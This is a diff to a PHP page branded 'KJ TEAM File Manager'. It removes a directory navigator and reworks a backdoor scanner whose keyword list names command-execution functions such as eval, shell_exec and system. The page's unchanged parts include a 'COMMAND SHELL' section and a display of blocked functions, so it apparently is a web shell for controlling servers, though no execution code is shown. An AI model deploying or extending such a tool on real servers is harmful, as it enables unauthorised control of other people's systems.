@@ -174,30 +174,7 @@ function quarantineFile($filePath) {
     return false;
 }
 
-// ============ FUNGSI NAVIGASI DIRECTORY ============
-function getDirectoryTree($path, $depth = 2, $maxItems = 50) {
-    $result = [];
-    if (!is_dir($path)) return $result;
-    
-    $items = scandir($path);
-    $count = 0;
-    foreach ($items as $item) {
-        if ($count >= $maxItems) break;
-        if ($item === '.' || $item === '..') continue;
-        
-        $fullPath = $path . DIRECTORY_SEPARATOR . $item;
-        if (is_dir($fullPath)) {
-            $result[] = [
-                'name' => $item,
-                'path' => $fullPath,
-                'type' => 'dir'
-            ];
-            $count++;
-        }
-    }
-    return $result;
-}
-
+// ============ FUNGSI NAVIGASI ============
 function getDriveList() {
     $drives = [];
     if (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN') {
@@ -210,8 +187,6 @@ function getDriveList() {
         if (empty($drives)) {
             $drives = ['C:', 'D:', 'E:', 'F:', 'G:', 'H:'];
         }
-    } else {
-        $drives = ['/', '/home', '/var', '/tmp', '/usr', '/etc', '/opt', '/root'];
     }
     return $drives;
 }
@@ -220,10 +195,8 @@ function getDriveList() {
 function buildBreadcrumb($path) {
     $isWindows = strtoupper(substr(PHP_OS, 0, 3)) === 'WIN';
     
-    // Split path
     if ($isWindows) {
         $parts = explode('\\', $path);
-        // Untuk Windows, tambahkan drive di awal
         if (strpos($path, ':') !== false) {
             $drive = $parts[0];
             $parts = array_filter($parts);
@@ -271,7 +244,6 @@ $currentPath = $isWindows
     ? str_replace('/', DIRECTORY_SEPARATOR, $inputPath)
     : str_replace('\\', DIRECTORY_SEPARATOR, $inputPath);
 
-// Validasi path
 if (!is_dir($currentPath)) {
     $currentPath = getcwd();
 }
@@ -585,69 +557,117 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
         }
     }
 
-    // Scan Backdoor
+    // ============ SCAN BACKDOOR - HANYA PHP, PHTML, SHTML ============
     if (isset($_POST['scan_backdoor'])) {
         $scanPath = $_POST['scan_path'] ?? $currentPath;
         if (!is_dir($scanPath)) {
             echo "<div class='alert error'>⚠️ Direktori tidak valid.</div>";
         } else {
+            // HANYA ekstensi PHP, PHTML, SHTML
+            $allowedExtensions = ['php', 'phtml', 'shtml'];
+            
             $danger_keywords = [
-                'tinggi' => ['eval(', 'shell_exec(', 'exec(', 'passthru(', 'system(', 'base64_decode(', 'gzinflate('],
-                'biasa' => ['file_put_contents(', 'file_get_contents(', 'move_uploaded_file(']
+                'tinggi' => ['eval(', 'shell_exec(', 'exec(', 'passthru(', 'system(', 'base64_decode(', 'gzinflate(', 'assert('],
+                'biasa' => ['file_put_contents(', 'file_get_contents(', 'move_uploaded_file('],
+                'xss' => ['<script', 'alert(', 'document.write(', 'onerror=', 'onload=', 'javascript:', 'expression(']
             ];
 
             $suspectFiles = [];
+            $scanLog = [];
+            $scanLog[] = "==================================================";
+            $scanLog[] = "📋 HASIL SCAN BACKDOOR - KJ TEAM";
+            $scanLog[] = "==================================================";
+            $scanLog[] = "📁 Path: " . $scanPath;
+            $scanLog[] = "📅 Tanggal: " . date('Y-m-d H:i:s');
+            $scanLog[] = "🖥️ IP: " . $_SERVER['REMOTE_ADDR'];
+            $scanLog[] = "📁 Ekstensi: PHP, PHTML, SHTML";
+            $scanLog[] = "==================================================\n";
 
-            function scanBackdoorDeep($dir, &$results, $danger_keywords) {
+            function scanBackdoorDeep($dir, &$results, $danger_keywords, $allowedExtensions, &$scanLog) {
                 $items = scandir($dir);
                 foreach ($items as $item) {
-                    if ($item === '.' || $item === '..')
-                        continue;
+                    if ($item === '.' || $item === '..') continue;
                     $path = $dir . DIRECTORY_SEPARATOR . $item;
 
-                    if (basename($path) === 'shell-found.txt')
-                        continue;
+                    // Skip file log
+                    if (basename($path) === 'shell-found.txt' || strpos(basename($path), 'scan_result_') === 0) continue;
 
                     if (is_dir($path)) {
-                        scanBackdoorDeep($path, $results, $danger_keywords);
+                        scanBackdoorDeep($path, $results, $danger_keywords, $allowedExtensions, $scanLog);
                     } else {
-                        $ext = pathinfo($path, PATHINFO_EXTENSION);
-                        if (in_array(strtolower($ext), ['php', 'phtml', 'inc', 'txt'])) {
+                        $ext = strtolower(pathinfo($path, PATHINFO_EXTENSION));
+                        // HANYA scan untuk PHP, PHTML, SHTML
+                        if (in_array($ext, $allowedExtensions)) {
                             $content = @file_get_contents($path);
-                            if (!$content)
-                                continue;
-                            $content = strtolower($content);
-
+                            if (!$content) continue;
+                            
+                            $content_lower = strtolower($content);
                             $detected = [];
-                            foreach ($danger_keywords as $level => $keywords) {
+                            $level = '';
+                            $matchKeywords = [];
+
+                            foreach ($danger_keywords as $lvl => $keywords) {
                                 foreach ($keywords as $kw) {
-                                    if (strpos($content, strtolower($kw)) !== false) {
+                                    if (strpos($content_lower, strtolower($kw)) !== false) {
                                         $detected[] = $kw;
+                                        $level = $lvl;
+                                        $matchKeywords[] = $kw;
                                     }
                                 }
                                 if (!empty($detected)) {
-                                    $results[] = [
-                                        'file' => $path,
-                                        'level' => $level,
-                                        'hits' => $detected
-                                    ];
                                     break;
                                 }
+                            }
+
+                            if (!empty($detected)) {
+                                $results[] = [
+                                    'file' => $path,
+                                    'level' => $level,
+                                    'hits' => $detected
+                                ];
+                                
+                                // Tambahkan ke log
+                                $scanLog[] = "🔴 FILE: " . $path;
+                                $scanLog[] = "    ⚠️ Level: " . strtoupper($level);
+                                $scanLog[] = "    🎯 Ditemukan: " . implode(', ', $detected);
+                                $scanLog[] = "    📊 Ukuran: " . formatSize(filesize($path));
+                                $scanLog[] = "    📅 Modified: " . date("Y-m-d H:i:s", filemtime($path));
+                                $scanLog[] = "    ---";
                             }
                         }
                     }
                 }
             }
 
-            scanBackdoorDeep($scanPath, $suspectFiles, $danger_keywords);
+            scanBackdoorDeep($scanPath, $suspectFiles, $danger_keywords, $allowedExtensions, $scanLog);
 
+            // Tambahkan ringkasan
+            $scanLog[] = "\n==================================================";
+            $scanLog[] = "📊 RINGKASAN SCAN";
+            $scanLog[] = "==================================================";
+            $scanLog[] = "📁 Total file mencurigakan: " . count($suspectFiles);
+            $scanLog[] = "📅 Selesai pada: " . date('Y-m-d H:i:s');
+            $scanLog[] = "==================================================";
+
+            // Simpan ke file TXT
+            $timestamp = date('Ymd_His');
+            $txtFileName = 'scan_result_' . $timestamp . '.txt';
+            $txtFilePath = __DIR__ . '/' . $txtFileName;
+            file_put_contents($txtFilePath, implode("\n", $scanLog));
+
+            // Tampilkan hasil di browser
             if (!empty($suspectFiles)) {
                 echo "<div style='margin:20px 0;'>";
+                echo "<div class='alert success'>✅ Scan selesai! Ditemukan " . count($suspectFiles) . " file mencurigakan.</div>";
+                echo "<div style='margin:10px 0;'>";
+                echo "<a href='$txtFileName' download class='btn' style='background:#4a9eff;color:#000;'>📥 Download Hasil Scan (TXT)</a>";
+                echo " <span style='color:#6c8cba;font-size:12px;'>(" . $txtFileName . ")</span>";
+                echo "</div>";
                 echo "<h3 style='color:#ff6b6b;'>🛑 Ditemukan File Mencurigakan:</h3><ul>";
                 foreach ($suspectFiles as $s) {
                     $file = $s['file'];
                     $level = strtoupper($s['level']);
-                    $color = $level === 'TINGGI' ? '#ff6b6b' : '#ffa94d';
+                    $color = $level === 'TINGGI' ? '#ff6b6b' : ($level === 'XSS' ? '#ffa94d' : '#ffd93d');
                     $hits = implode(', ', $s['hits']);
                     echo "<li style='margin:10px 0;padding:10px;background:#0d1117;border:1px solid #2d4a7a;border-radius:5px;'>
                         <span style='color:#88ccff;'>" . x($file) . "</span> 
@@ -659,11 +679,21 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
                         </form>
                     </li>";
                 }
-                echo "</ul></div>";
+                echo "</ul>";
+                echo "<div style='margin-top:10px;'>";
+                echo "<a href='$txtFileName' download class='btn' style='background:#4a9eff;color:#000;'>📥 Download Hasil Scan (TXT)</a>";
+                echo " <span style='color:#6c8cba;font-size:12px;'>(" . $txtFileName . ")</span>";
+                echo "</div>";
+                echo "</div>";
             } else {
-                echo "<div class='alert success'>✅ Tidak ditemukan file mencurigakan.</div>";
+                echo "<div class='alert success'>✅ Scan selesai! Tidak ditemukan file mencurigakan.</div>";
+                echo "<div style='margin-top:10px;'>";
+                echo "<a href='$txtFileName' download class='btn' style='background:#4a9eff;color:#000;'>📥 Download Hasil Scan (TXT)</a>";
+                echo " <span style='color:#6c8cba;font-size:12px;'>(" . $txtFileName . ")</span>";
+                echo "</div>";
             }
         }
+        exit; // Stop eksekusi setelah scan
     }
 }
 
@@ -683,10 +713,6 @@ foreach ($allItems as $item) {
 
 // ============ GET BREADCRUMB ============
 $breadcrumb = buildBreadcrumb($currentPath);
-
-// ============ GET DIRECTORY TREE ============
-$drives = getDriveList();
-$dirTree = getDirectoryTree($currentPath, 2, 30);
 
 // ============ TAMPILAN UTAMA ============
 ?>
@@ -869,25 +895,6 @@ $dirTree = getDirectoryTree($currentPath, 2, 30);
             background: linear-gradient(135deg, #7a2d2d, #9a4a4a);
         }
         .btn-sm { padding: 3px 8px; font-size: 12px; }
-        .btn-drive {
-            padding: 5px 15px;
-            background: #0a0e27;
-            color: #4a9eff;
-            border: 1px solid #2d4a7a;
-            border-radius: 5px;
-            cursor: pointer;
-            font-family: inherit;
-            transition: all 0.3s;
-        }
-        .btn-drive:hover {
-            background: #1a2a4a;
-            border-color: #4a9eff;
-            box-shadow: 0 0 15px rgba(74, 158, 255, 0.3);
-        }
-        .btn-drive.active {
-            background: #1a3a6a;
-            border-color: #4a9eff;
-        }
         
         input[type="text"], input[type="file"], select {
             padding: 6px 10px;
@@ -960,62 +967,6 @@ $dirTree = getDirectoryTree($currentPath, 2, 30);
         .mt-10 { margin-top: 10px; }
         .mb-10 { margin-bottom: 10px; }
         
-        .dir-navigator {
-            background: #0a0e27;
-            border: 1px solid #2d4a7a;
-            border-radius: 8px;
-            padding: 10px;
-            max-height: 300px;
-            overflow-y: auto;
-        }
-        .dir-navigator::-webkit-scrollbar {
-            width: 5px;
-        }
-        .dir-navigator::-webkit-scrollbar-track {
-            background: #0a0e27;
-        }
-        .dir-navigator::-webkit-scrollbar-thumb {
-            background: #2d4a7a;
-            border-radius: 5px;
-        }
-        .dir-item {
-            padding: 6px 10px;
-            margin: 2px 0;
-            border-radius: 5px;
-            cursor: pointer;
-            transition: all 0.2s;
-            display: flex;
-            align-items: center;
-            gap: 8px;
-        }
-        .dir-item:hover {
-            background: #1a2a4a;
-        }
-        .dir-item a {
-            color: #88ccff;
-            text-decoration: none;
-            flex: 1;
-        }
-        .dir-item a:hover {
-            color: #4a9eff;
-        }
-        .dir-item .icon {
-            font-size: 16px;
-        }
-        .dir-item .name {
-            flex: 1;
-        }
-        .dir-item .size {
-            color: #6c8cba;
-            font-size: 11px;
-        }
-        .drive-list {
-            display: flex;
-            flex-wrap: wrap;
-            gap: 5px;
-            margin-bottom: 10px;
-        }
-        
         @media (max-width: 768px) {
             body { padding: 10px; }
             table { font-size: 12px; }
@@ -1032,10 +983,6 @@ $dirTree = getDirectoryTree($currentPath, 2, 30);
         function navigateTo(path) {
             window.location.href = '?d=' + encodeURIComponent(path);
         }
-        
-        function goToDrive(drive) {
-            navigateTo(drive);
-        }
     </script>
 </head>
 <body>
@@ -1043,7 +990,7 @@ $dirTree = getDirectoryTree($currentPath, 2, 30);
     <!-- HEADER -->
     <div class="header">
         <img src="https://i.ibb.co/Df8g5PYb/kj.png" alt="Kj TEAM">
-        <h1>KJ TEAM</h1>
+        <h1>KJ TEAM FILE MANAGER</h1>
         <div>
             <span class="badge badge-safe">🔒 Secure Mode</span>
             <span class="badge badge-safe">🛡️ Malware Protection</span>
@@ -1092,45 +1039,6 @@ $dirTree = getDirectoryTree($currentPath, 2, 30);
         echo "<div class='alert info'>⚠️ Fungsi yang diblokir: <strong>$disabled</strong></div>";
     }
     ?>
-
-    <!-- DIRECTORY NAVIGATOR -->
-    <div class="section-box">
-        <h3>📂 Quick Navigation</h3>
-        
-        <!-- Drive List -->
-        <div class="drive-list">
-            <?php foreach ($drives as $drive): ?>
-                <button onclick="goToDrive('<?php echo $drive; ?>')" class="btn-drive <?php echo (strpos($currentPath, $drive) === 0) ? 'active' : ''; ?>">
-                    💾 <?php echo $drive; ?>
-                </button>
-            <?php endforeach; ?>
-        </div>
-        
-        <!-- Directory Tree -->
-        <div class="dir-navigator">
-            <?php if (!empty($dirTree)): ?>
-                <?php foreach ($dirTree as $dir): ?>
-                    <div class="dir-item">
-                        <span class="icon">📁</span>
-                        <a href="?d=<?php echo urlencode($dir['path']); ?>" class="name"><?php echo x($dir['name']); ?></a>
-                        <span class="size">↗ click</span>
-                    </div>
-                <?php endforeach; ?>
-            <?php else: ?>
-                <div style="color:#6c8cba;padding:10px;text-align:center;">
-                    ℹ️ Tidak ada sub-directory ditemukan
-                </div>
-            <?php endif; ?>
-        </div>
-        
-        <!-- Custom Path Input -->
-        <div class="flex-wrap mt-10">
-            <form method="GET" style="flex:1;display:flex;gap:5px;">
-                <input type="text" name="d" placeholder="Masukkan path custom..." value="<?php echo x($currentPath); ?>" style="flex:1;min-width:200px;">
-                <button type="submit" class="btn">🚀 Go</button>
-            </form>
-        </div>
-    </div>
 
     <!-- COMMAND SHELL -->
     <div class="section-box">
@@ -1184,6 +1092,9 @@ $dirTree = getDirectoryTree($currentPath, 2, 30);
             <input type="text" name="scan_path" placeholder="Path yang ingin discan" value="<?php echo x($currentPath); ?>" style="flex:1;min-width:200px;">
             <button type="submit" name="scan_backdoor" class="btn">🔍 Scan</button>
         </form>
+        <div style="margin-top:8px;font-size:12px;color:#4a9eff;">
+            📁 Ekstensi yang discan: <strong>PHP, PHTML, SHTML</strong>
+        </div>
     </div>
 
     <!-- ZIP/UNZIP -->
@@ -1298,7 +1209,7 @@ $dirTree = getDirectoryTree($currentPath, 2, 30);
     </div>
 
     <div style="text-align:center;padding:20px;color:#6c8cba;font-size:12px;border-top:1px solid #2d4a7a;margin-top:20px;">
-        Kj TEAM File Manager v2.0 | Protected Mode | Click any directory to navigate
+        KJ TEAM File Manager v2.0 | Protected Mode | Click any directory to navigate
     </div>
 </div>
 
